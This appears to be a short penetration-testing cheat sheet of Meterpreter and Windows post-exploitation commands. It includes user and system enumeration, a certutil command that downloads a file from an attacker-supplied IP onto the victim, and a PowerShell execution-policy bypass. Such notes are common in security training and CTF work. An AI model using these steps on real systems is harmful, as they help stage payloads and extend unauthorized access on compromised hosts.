# Basics

meterpreter commands

```
getuid
```

```
sysinfo
```

```
shell
```

Shell Commands

```
dir                         #ls alternative for windows
```

```
systeminfo
```

## file transfer windows

```
certutil -urlcache -f http://<ip>/<filename> <filename to be saved as>
```

how to grep

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

Output

```
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
System Type:               X86-based PC
```

If u have a meterpreter connection to window

```
load powershell
```

if a normal shell then&#x20;

```
powershell -p bypass
```

